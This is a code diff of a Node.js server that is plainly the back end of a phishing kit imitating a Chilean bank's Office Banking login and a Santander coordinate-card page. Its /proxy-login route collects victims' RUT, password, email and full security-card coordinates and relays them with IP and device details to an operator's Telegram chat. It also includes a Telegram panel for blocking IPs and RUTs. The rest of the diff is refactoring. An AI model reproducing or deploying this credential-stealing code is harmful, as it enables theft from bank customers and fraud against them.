@@ -6,50 +6,51 @@ const path = require("path");
 const Database = require("better-sqlite3");
 const db = new Database("panel.db");
 
-db.serialize(() => {
-  db.run(`CREATE TABLE IF NOT EXISTS ips_bloqueadas (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    ip TEXT NOT NULL,
-    motivo TEXT,
-    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
+// =======================
+//   TABLAS SQLITE
+// =======================
+db.prepare(`CREATE TABLE IF NOT EXISTS ips_bloqueadas (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  ip TEXT NOT NULL,
+  motivo TEXT,
+  fecha DATETIME DEFAULT CURRENT_TIMESTAMP
+)`).run();
 
-  db.run(`CREATE TABLE IF NOT EXISTS ruts_bloqueados (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    rut TEXT NOT NULL,
-    motivo TEXT,
-    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
+db.prepare(`CREATE TABLE IF NOT EXISTS ruts_bloqueados (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  rut TEXT NOT NULL,
+  motivo TEXT,
+  fecha DATETIME DEFAULT CURRENT_TIMESTAMP
+)`).run();
 
-  db.run(`CREATE TABLE IF NOT EXISTS intentos_ip (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    ip TEXT NOT NULL,
-    ruta TEXT,
-    metodo TEXT,
-    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
+db.prepare(`CREATE TABLE IF NOT EXISTS intentos_ip (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  ip TEXT NOT NULL,
+  ruta TEXT,
+  metodo TEXT,
+  fecha DATETIME DEFAULT CURRENT_TIMESTAMP
+)`).run();
 
-  db.run(`CREATE TABLE IF NOT EXISTS intentos_rut (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    rut TEXT NOT NULL,
-    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
+db.prepare(`CREATE TABLE IF NOT EXISTS intentos_rut (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  rut TEXT NOT NULL,
+  fecha DATETIME DEFAULT CURRENT_TIMESTAMP
+)`).run();
 
-  db.run(`CREATE TABLE IF NOT EXISTS panel_logs (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    tipo TEXT,
-    mensaje TEXT,
-    fecha DATETIME DEFAULT CURRENT_TIMESTAMP
-  )`);
-});
-
+db.prepare(`CREATE TABLE IF NOT EXISTS panel_logs (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  tipo TEXT,
+  mensaje TEXT,
+  fecha DATETIME DEFAULT CURRENT_TIMESTAMP
+)`).run();
 
 const app = express();
 
-// 🔥 NECESARIO PARA QUE FUNCIONE CON WWW Y SIN WWW
-app.set("trust proxy", true);  
+// =======================
+//   CORS / STATIC
+// =======================
+app.set("trust proxy", true);
 
-// ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
   origin: function(origin, callback) {
     if (
@@ -76,11 +77,11 @@ app.options("*", cors(corsOptions));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// =============================================
-//   🔥 BLOQUEO DE CORREOS SOSPECHOSOS 🔥
-// =============================================
+// =======================
+//   BLOQUEO CORREOS
+// =======================
 const correosBloqueados = [
-  "f.tamarugal@gmail.com",   // <-- reemplaza aquí
+  "f.tamarugal@gmail.com",
   "otro@dominio.com"
 ];
 
@@ -102,61 +103,56 @@ app.use((req, res, next) => {
   next();
 });
 
-// =============================================
-//   🔥 PANEL TÉCNICO + BLOQUEO POR IP 🔥
-// =============================================
-function registrarIntentoIP(ip, req) {
-  if (!ip) return;
-  db.run(
-    "INSERT INTO intentos_ip (ip, ruta, metodo) VALUES (?, ?, ?)",
-    [ip, req.path, req.method]
-  );
-}
-
+// =======================
+//   FUNCIONES IP (better-sqlite3)
+// =======================
 function bloquearIP(ip, motivo = "Bloqueo manual") {
   if (!ip) return;
-  db.run(
-    "INSERT INTO ips_bloqueadas (ip, motivo) VALUES (?, ?)",
-    [ip, motivo]
-  );
-  enviarEventoTecnico(
-    `⛔ IP BLOQUEADA\nIP: ${ip}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
-  );
+  db.prepare("INSERT INTO ips_bloqueadas (ip, motivo) VALUES (?, ?)").run(ip, motivo);
+  enviarEventoTecnico(`⛔ IP BLOQUEADA\nIP: ${ip}\nMotivo: ${motivo}`);
 }
 
 function desbloquearIP(ip) {
   if (!ip) return;
-  db.run("DELETE FROM ips_bloqueadas WHERE ip = ?", [ip]);
-  enviarEventoTecnico(
-    `🔓 IP DESBLOQUEADA\nIP: ${ip}\nHora: ${new Date().toLocaleString("es-CL")}`
+  db.prepare("DELETE FROM ips_bloqueadas WHERE ip = ?").run(ip);
+  enviarEventoTecnico(`🔓 IP DESBLOQUEADA\nIP: ${ip}`);
+}
+
+function estaBloqueadaIP(ip) {
+  if (!ip) return false;
+  const row = db.prepare("SELECT 1 AS ok FROM ips_bloqueadas WHERE ip = ? LIMIT 1").get(ip);
+  return !!row;
+}
+
+function registrarIntentoIP(ip, req) {
+  if (!ip) return;
+  db.prepare("INSERT INTO intentos_ip (ip, ruta, metodo) VALUES (?, ?, ?)").run(
+    ip,
+    req.path,
+    req.method
   );
 }
 
-function estaBloqueadaIP(ip, callback) {
-  if (!ip) return callback(false);
-  db.get("SELECT 1 FROM ips_bloqueadas WHERE ip = ? LIMIT 1", [ip], (err, row) => {
-    callback(!!row);
-  });
-}
-
-// Middleware global de bloqueo técnico por IP
+// =======================
+//   MIDDLEWARE IP BLOQUEADA
+// =======================
 app.use((req, res, next) => {
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  estaBloqueadaIP(ip, bloqueada => {
-    if (bloqueada) {
-      enviarEventoTecnico(
-        `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
-      );
-      return res.status(403).json({ error: "IP bloqueada" });
-    }
+  if (estaBloqueadaIP(ip)) {
+    enviarEventoTecnico(
+      `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
+    );
+    return res.status(403).json({ error: "IP bloqueada" });
+  }
 
-    registrarIntentoIP(ip, req);
-    next();
-  });
+  registrarIntentoIP(ip, req);
+  next();
 });
 
-// ✅ Middleware para logging detallado
+// =======================
+//   LOGGING
+// =======================
 app.use((req, res, next) => {
   console.log(`\n📨 ${req.method} ${req.path}`);
   console.log(`Origin: ${req.get("origin")}`);
@@ -166,7 +162,9 @@ app.use((req, res, next) => {
   next();
 });
 
-// Verificación de variables de entorno
+// =======================
+//   CONFIG ENTORNO
+// =======================
 console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
 console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
 console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
@@ -175,12 +173,13 @@ if (process.env.TELEGRAM_TOKEN)
 if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
 console.log("================================\n");
 
-// Health check
+// =======================
+//   HEALTH / CONFIG
+// =======================
 app.get("/health", (req, res) => {
   res.json({ status: "ok", message: "Servidor funcionando correctamente" });
 });
 
-// Leer configuración
 app.get("/config", (req, res) => {
   try {
     const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
@@ -190,18 +189,6 @@ app.get("/config", (req, res) => {
   }
 });
 
-// Procesar saldo
-app.post("/procesarSaldo", async (req, res) => {
-  const { rut, passwd } = req.body;
-  try {
-    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
-  } catch (err) {
-    console.error("Error en procesarSaldo:", err);
-    res.status(500).json({ status: "error", error: err.message });
-  }
-});
-
-// Guardar configuración
 app.post("/config", (req, res) => {
   try {
     fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
@@ -211,24 +198,23 @@ app.post("/config", (req, res) => {
   }
 });
 
-// Admin
+// =======================
+//   PÁGINAS
+// =======================
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
-// Autorización
 app.get("/autorizacion", (req, res) => {
   try {
     const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
     if (cfg.tipoAutorizacion === "santander") {
-      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
-      return;
+      return res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
     }
 
     if (cfg.tipoAutorizacion === "coordenadas") {
-      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
-      return;
+      return res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
     }
 
     res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
@@ -237,7 +223,9 @@ app.get("/autorizacion", (req, res) => {
   }
 });
 
-// Enviar autorización a Telegram
+// =======================
+//   TELEGRAM
+// =======================
 app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
@@ -255,7 +243,6 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Función para enviar a Telegram (mensajes normales)
 async function enviarATelegram(mensaje) {
   try {
     const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
@@ -277,14 +264,15 @@ async function enviarATelegram(mensaje) {
   }
 }
 
-// Función para enviar eventos técnicos al “panel” (sin datos sensibles)
 async function enviarEventoTecnico(mensaje) {
   if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) return false;
   const prefijo = "📡 EVENTO TÉCNICO\n";
   return enviarATelegram(prefijo + mensaje);
 }
 
-// 🔍 Detección de navegador / sistema / dispositivo
+// =======================
+//   DETECCIÓN NAVEGADOR
+// =======================
 function detectarNavegador(userAgent) {
   userAgent = userAgent || "";
 
@@ -309,39 +297,54 @@ function detectarNavegador(userAgent) {
   return { navegador, sistema, dispositivo };
 }
 
-// =============================================
-//   🔥🔥🔥  BLOQUE /proxy-login ORIGINAL  🔥🔥🔥
-//   (solo se le agrega panel técnico / IP)   //
-// =============================================
+// =======================
+//   FUNCIONES RUT (better-sqlite3)
+// =======================
+function bloquearRUT(rut, motivo = "Bloqueo manual") {
+  if (!rut) return;
+  db.prepare("INSERT INTO ruts_bloqueados (rut, motivo) VALUES (?, ?)").run(rut, motivo);
+  enviarEventoTecnico(`⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}`);
+}
 
+function desbloquearRUT(rut) {
+  if (!rut) return;
+  db.prepare("DELETE FROM ruts_bloqueados WHERE rut = ?").run(rut);
+  enviarEventoTecnico(`🔓 RUT DESBLOQUEADO\nRUT: ${rut}`);
+}
+
+function registrarIntentoRUT(rut) {
+  if (!rut) return;
+  db.prepare("INSERT INTO intentos_rut (rut) VALUES (?)").run(rut);
+}
+
+function estaBloqueadoRUT(rut) {
+  if (!rut) return false;
+  const row = db.prepare("SELECT 1 AS ok FROM ruts_bloqueados WHERE rut = ? LIMIT 1").get(rut);
+  return !!row;
+}
+
+// =======================
+//   /proxy-login
+// =======================
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail, coordenadas } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const infoNavegador = detectarNavegador(userAgent);
 
-  // 🔥 Registrar intento SIEMPRE
   if (rut) registrarIntentoRUT(rut);
 
-  // 🔥 Verificar si el RUT está bloqueado
-  if (rut) {
-    return estaBloqueadoRUT(rut, bloqueado => {
-      if (bloqueado) {
-        enviarEventoTecnico(`⛔ Intento de login con RUT bloqueado: ${rut}`);
-        return res.status(403).json({
-          status: "error",
-          mensaje: "RUT bloqueado"
-        });
-      }
-
-      // Si NO está bloqueado → continuar flujo normal
-      procesarLogin();
+  // Bloqueo inmediato si el RUT está en la tabla
+  if (rut && estaBloqueadoRUT(rut)) {
+    enviarEventoTecnico(`⛔ Intento de login con RUT bloqueado: ${rut}`);
+    return res.status(403).json({
+      status: "error",
+      mensaje: "RUT bloqueado"
     });
   }
 
-  async function procesarLogin() {
-    enviarEventoTecnico(
-      `Nuevo request a /proxy-login
+  enviarEventoTecnico(
+    `Nuevo request a /proxy-login
 IP: ${ip}
 Método: POST
 Navegador: ${infoNavegador.navegador}
@@ -350,24 +353,24 @@ Dispositivo: ${infoNavegador.dispositivo}
 Tiene mail: ${!!mail}
 Tiene login: ${!!(rut && passwd)}
 Tiene coordenadas: ${!!coordenadas}`
-    );
+  );
 
-    try {
-      // 📧 CORREO
-      if (mail) {
-        const mensajeCorrecto = `📧 Correo actualizado:
+  try {
+    // 📧 CORREO
+    if (mail) {
+      const mensajeCorrecto = `📧 Correo actualizado:
 ${mail}
 IP: ${ip}
 Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
-        await enviarATelegram(mensajeCorrecto);
-        return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
-      }
+      await enviarATelegram(mensajeCorrecto);
+      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+    }
 
-      // 🔐 LOGIN
-      if (rut && passwd) {
-        const mensajeLogin = `🔐 Nuevo Login en Office Banking:
+    // 🔐 LOGIN
+    if (rut && passwd) {
+      const mensajeLogin = `🔐 Nuevo Login en Office Banking:
 RUT: ${rut}
 Clave: ${passwd}
 IP: ${ip}
@@ -376,96 +379,64 @@ Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
 
-        await enviarATelegram(mensajeLogin);
-        return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
-      }
+      await enviarATelegram(mensajeLogin);
+      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+    }
 
-      // 🔢 COORDENADAS
-      if (coordenadas) {
-        const coords = coordenadas;
-        let texto = "🔐 Tarjeta de Coordenadas\n\n";
+    // 🔢 COORDENADAS
+    if (coordenadas) {
+      const coords = coordenadas;
+      let texto = "🔐 Tarjeta de Coordenadas\n\n";
 
-        const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];
+      const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];
 
-        for (let fila = 1; fila <= 5; fila++) {
-          let linea = "";
-          for (let col of letras) {
-            linea += `${col}${fila}: ${coords[col + fila]} | `;
-          }
-          texto += linea.slice(0, -3) + "\n";
+      for (let fila = 1; fila <= 5; fila++) {
+        let linea = "";
+        for (let col of letras) {
+          linea += `${col}${fila}: ${coords[col + fila]} | `;
         }
-
-        texto += `\nIP: ${ip}`;
-        texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
-        texto += `\nNavegador: ${infoNavegador.navegador}`;
-        texto += `\nSistema: ${infoNavegador.sistema}`;
-        texto += `\nDispositivo: ${infoNavegador.dispositivo}`;
-
-        await enviarATelegram(texto);
-
-        return res.json({
-          status: "ok",
-          mensaje: "Coordenadas recibidas correctamente"
-        });
+        texto += linea.slice(0, -3) + "\n";
       }
 
-      // Datos inválidos
-      registrarIntentoIP(ip);
-      enviarEventoTecnico(
-        `❌ Datos inválidos en /proxy-login
+      texto += `\nIP: ${ip}`;
+      texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
+      texto += `\nNavegador: ${infoNavegador.navegador}`;
+      texto += `\nSistema: ${infoNavegador.sistema}`;
+      texto += `\nDispositivo: ${infoNavegador.dispositivo}`;
+
+      await enviarATelegram(texto);
+
+      return res.json({
+        status: "ok",
+        mensaje: "Coordenadas recibidas correctamente"
+      });
+    }
+
+    // Datos inválidos
+    registrarIntentoIP(ip, req);
+    enviarEventoTecnico(
+      `❌ Datos inválidos en /proxy-login
 IP: ${ip}
 Hora: ${new Date().toLocaleString("es-CL")}`
-      );
+    );
 
-      res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
-    } catch (err) {
-      console.error(`❌ Error en /proxy-login:`, err);
-      registrarIntentoIP(ip);
-      enviarEventoTecnico(
-        `⚠️ Error en /proxy-login
+    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
+  } catch (err) {
+    console.error(`❌ Error en /proxy-login:`, err);
+    registrarIntentoIP(ip, req);
+    enviarEventoTecnico(
+      `⚠️ Error en /proxy-login
 IP: ${ip}
 Error: ${err.message}
 Hora: ${new Date().toLocaleString("es-CL")}`
-      );
-      res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
-    }
+    );
+    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
   }
 });
-// =============================================
-//   🔥 BLOQUEO TÉCNICO POR RUT 🔥
-// =============================================
-function bloquearRUT(rut, motivo = "Bloqueo manual") {
-  if (!rut) return;
-  db.run(
-    "INSERT INTO ruts_bloqueados (rut, motivo) VALUES (?, ?)",
-    [rut, motivo]
-  );
-  enviarEventoTecnico(`⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}`);
-}
 
-function desbloquearRUT(rut) {
-  if (!rut) return;
-  db.run("DELETE FROM ruts_bloqueados WHERE rut = ?", [rut]);
-  enviarEventoTecnico(`🔓 RUT DESBLOQUEADO\nRUT: ${rut}`);
-}
-
-function registrarIntentoRUT(rut) {
-  if (!rut) return;
-  db.run("INSERT INTO intentos_rut (rut) VALUES (?)", [rut]);
-}
-
-function estaBloqueadoRUT(rut, callback) {
-  if (!rut) return callback(false);
-  db.get("SELECT 1 FROM ruts_bloqueados WHERE rut = ? LIMIT 1", [rut], (err, row) => {
-    callback(!!row);
-  });
-}
-
-// =============================================
-//   🔥 PANEL TÉCNICO UNIFICADO (VERSIÓN RÁPIDA) 🔥
-// =============================================
-
-// 📡 Menú principal
+// =======================
+//   PANEL TÉCNICO (Telegram)
+// =======================
 async function enviarPanelUnificado(chatId) {
   const texto = `📡 PANEL TÉCNICO UNIFICADO
 Selecciona una opción:`;
@@ -494,7 +465,22 @@ Selecciona una opción:`;
   });
 }
 
-// 📊 Estado del servidor
+async function construirPanelTexto() {
+  const totalIPs = db.prepare("SELECT COUNT(*) AS c FROM intentos_ip").get().c;
+  const totalRUTs = db.prepare("SELECT COUNT(*) AS c FROM intentos_rut").get().c;
+  const bloqueadasIPs = db.prepare("SELECT COUNT(*) AS c FROM ips_bloqueadas").get().c;
+  const bloqueadosRUTs = db.prepare("SELECT COUNT(*) AS c FROM ruts_bloqueados").get().c;
+
+  return `📊 ESTADO DEL SERVIDOR
+
+IPs con actividad: ${totalIPs}
+IPs bloqueadas: ${bloqueadasIPs}
+RUTs con actividad: ${totalRUTs}
+RUTs bloqueados: ${bloqueadosRUTs}
+
+Hora: ${new Date().toLocaleString("es-CL")}`;
+}
+
 async function panelEstado(chatId) {
   const texto = await construirPanelTexto();
 
@@ -508,18 +494,8 @@ async function panelEstado(chatId) {
   });
 }
 
-// 📈 Estadísticas
 async function panelStats(chatId) {
-  const texto = `
-📈 ESTADÍSTICAS TÉCNICAS
-
-IPs con actividad: ${intentosPorIP.size}
-IPs bloqueadas: ${ipsBloqueadas.size}
-RUTs con actividad: ${intentosPorRUT.size}
-RUTs bloqueados: ${rutsBloqueados.size}
-
-Hora: ${new Date().toLocaleString("es-CL")}
-`;
+  const texto = await construirPanelTexto();
 
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
@@ -531,7 +507,6 @@ Hora: ${new Date().toLocaleString("es-CL")}
   });
 }
 
-// 📡 Panel en vivo
 async function panelVivo(chatId) {
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
@@ -545,7 +520,6 @@ async function panelVivo(chatId) {
   await enviarPanelTecnicoVivo(chatId);
 }
 
-// 📜 Stream técnico
 async function panelStream(chatId) {
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
@@ -556,42 +530,44 @@ async function panelStream(chatId) {
     })
   });
 
-  await enviarStreamTecnico("Stream iniciado");
+  await enviarEventoTecnico("Stream iniciado");
 }
 
 async function panelIPs(chatId, page = 0) {
   const porPagina = 3;
   const offset = page * porPagina;
 
-  db.all("SELECT ip FROM ips_bloqueadas ORDER BY fecha DESC LIMIT ? OFFSET ?", [porPagina, offset], (errBloq, bloqueadas) => {
-    db.all("SELECT ip, COUNT(*) AS intentos FROM intentos_ip GROUP BY ip ORDER BY intentos DESC LIMIT ? OFFSET ?", [porPagina, offset], async (errInt, intentos) => {
-      const lista = [
-        ...bloqueadas.map(i => ({ ip: i.ip, tipo: "desbloquear" })),
-        ...intentos.map(i => ({ ip: i.ip, tipo: "bloquear" }))
-      ];
+  const bloqueadas = db.prepare(
+    "SELECT ip FROM ips_bloqueadas ORDER BY fecha DESC LIMIT ? OFFSET ?"
+  ).all(porPagina, offset);
 
-      const botones = [];
+  const intentos = db.prepare(
+    "SELECT ip, COUNT(*) AS intentos FROM intentos_ip GROUP BY ip ORDER BY intentos DESC LIMIT ? OFFSET ?"
+  ).all(porPagina, offset);
 
-      for (const item of lista) {
-        if (item.tipo === "bloquear") {
-          botones.push([{ text: `⛔ Bloquear ${item.ip}`, callback_data: `bloquear_ip_${item.ip}` }]);
-        } else {
-          botones.push([{ text: `🔓 Desbloquear ${item.ip}`, callback_data: `desbloquear_ip_${item.ip}` }]);
-        }
-      }
+  const lista = [
+    ...bloqueadas.map(i => ({ ip: i.ip, tipo: "desbloquear" })),
+    ...intentos.map(i => ({ ip: i.ip, tipo: "bloquear" }))
+  ];
 
-      botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);
+  const botones = lista.map(item => {
+    if (item.tipo === "bloquear") {
+      return [{ text: `⛔ Bloquear ${item.ip}`, callback_data: `bloquear_ip_${item.ip}` }];
+    } else {
+      return [{ text: `🔓 Desbloquear ${item.ip}`, callback_data: `desbloquear_ip_${item.ip}` }];
+    }
+  });
 
-      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: "🛡 IPs detectadas",
-          reply_markup: { inline_keyboard: botones }
-        })
-      });
-    });
+  botones.push([{ text: "⬅ Volver al menú", callback_data: "panel_back" }]);
+
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: "🛡 IPs detectadas",
+      reply_markup: { inline_keyboard: botones }
+    })
   });
 }
 
@@ -599,24 +575,13 @@ async function panelRUTs(chatId, page = 0) {
   const porPagina = 3;
   const offset = page * porPagina;
 
-  // Ejecutar ambas consultas en paralelo
-  const bloqueadosPromise = new Promise((resolve) => {
-    db.all(
-      "SELECT rut FROM ruts_bloqueados ORDER BY fecha DESC LIMIT ? OFFSET ?",
-      [porPagina, offset],
-      (err, rows) => resolve(rows || [])
-    );
-  });
+  const bloqueados = db.prepare(
+    "SELECT rut FROM ruts_bloqueados ORDER BY fecha DESC LIMIT ? OFFSET ?"
+  ).all(porPagina, offset);
 
-  const intentosPromise = new Promise((resolve) => {
-    db.all(
-      "SELECT rut, COUNT(*) AS intentos FROM intentos_rut GROUP BY rut ORDER BY intentos DESC LIMIT ? OFFSET ?",
-      [porPagina, offset],
-      (err, rows) => resolve(rows || [])
-    );
-  });
-
-  const [bloqueados, intentos] = await Promise.all([bloqueadosPromise, intentosPromise]);
+  const intentos = db.prepare(
+    "SELECT rut, COUNT(*) AS intentos FROM intentos_rut GROUP BY rut ORDER BY intentos DESC LIMIT ? OFFSET ?"
+  ).all(porPagina, offset);
 
   const lista = [
     ...bloqueados.map(r => ({ rut: r.rut, tipo: "desbloquear" })),
@@ -644,7 +609,6 @@ async function panelRUTs(chatId, page = 0) {
   });
 }
 
-// 📡 Panel técnico en vivo
 async function enviarPanelTecnicoVivo(chatId) {
   const texto = await construirPanelTexto();
 
@@ -657,6 +621,7 @@ async function enviarPanelTecnicoVivo(chatId) {
     })
   });
 }
+
 async function responderCallback(callbackId, texto) {
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
     method: "POST",
@@ -669,66 +634,48 @@ async function responderCallback(callbackId, texto) {
   });
 }
 
-
+// =======================
+//   WEBHOOK TELEGRAM
+// =======================
 app.post("/telegram-webhook", async (req, res) => {
   const update = req.body;
 
-  // ============================
-  //   📌 BOTONES (callback_query)
-  // ============================
   if (update.callback_query) {
     const data = update.callback_query.data;
     const chatId = update.callback_query.message.chat.id;
 
-    // Menú principal
-    if (data === "panel_estado") return panelEstado(chatId);
-    if (data === "panel_stats") return panelStats(chatId);
-    if (data === "panel_vivo") return panelVivo(chatId);
-    if (data === "panel_stream") return panelStream(chatId);
-    if (data === "panel_ips") return panelIPs(chatId);
-    if (data === "panel_ruts") return panelRUTs(chatId);
-    if (data === "panel_back") return enviarPanelUnificado(chatId);
-
-    // ============================
-    //   🔥 BLOQUEAR / DESBLOQUEAR IP
-    // ============================
-    if (data.startsWith("bloquear_ip_")) {
+    if (data === "panel_estado") await panelEstado(chatId);
+    else if (data === "panel_stats") await panelStats(chatId);
+    else if (data === "panel_vivo") await panelVivo(chatId);
+    else if (data === "panel_stream") await panelStream(chatId);
+    else if (data === "panel_ips") await panelIPs(chatId);
+    else if (data === "panel_ruts") await panelRUTs(chatId);
+    else if (data === "panel_back") await enviarPanelUnificado(chatId);
+    else if (data.startsWith("bloquear_ip_")) {
       const ip = data.replace("bloquear_ip_", "");
       bloquearIP(ip, "Bloqueo manual desde panel");
       await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
-      return panelIPs(chatId);
-    }
-
-    if (data.startsWith("desbloquear_ip_")) {
+      await panelIPs(chatId);
+    } else if (data.startsWith("desbloquear_ip_")) {
       const ip = data.replace("desbloquear_ip_", "");
       desbloquearIP(ip);
       await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
-      return panelIPs(chatId);
-    }
-
-    // ============================
-    //   🔥 BLOQUEAR / DESBLOQUEAR RUT
-    // ============================
-    if (data.startsWith("bloquear_rut_")) {
+      await panelIPs(chatId);
+    } else if (data.startsWith("bloquear_rut_")) {
       const rut = data.replace("bloquear_rut_", "");
       bloquearRUT(rut, "Bloqueo manual desde panel");
       await responderCallback(update.callback_query.id, `RUT bloqueado: ${rut}`);
-      return panelRUTs(chatId);
-    }
-
-    if (data.startsWith("desbloquear_rut_")) {
+      await panelRUTs(chatId);
+    } else if (data.startsWith("desbloquear_rut_")) {
       const rut = data.replace("desbloquear_rut_", "");
       desbloquearRUT(rut);
       await responderCallback(update.callback_query.id, `RUT desbloqueado: ${rut}`);
-      return panelRUTs(chatId);
+      await panelRUTs(chatId);
     }
 
     return res.sendStatus(200);
   }
 
-  // ============================
-  //   📌 MENSAJES NORMALES
-  // ============================
   if (update.message) {
     const text = update.message.text || "";
     const chatId = update.message.chat.id;
@@ -741,15 +688,19 @@ app.post("/telegram-webhook", async (req, res) => {
   res.sendStatus(200);
 });
 
-// Página principal
+// =======================
+//   ROOT / 404
+// =======================
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// 404
 app.use((req, res) => {
   res.status(404).json({ error: "Ruta no encontrada" });
 });
 
+// =======================
+//   SERVER
+// =======================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
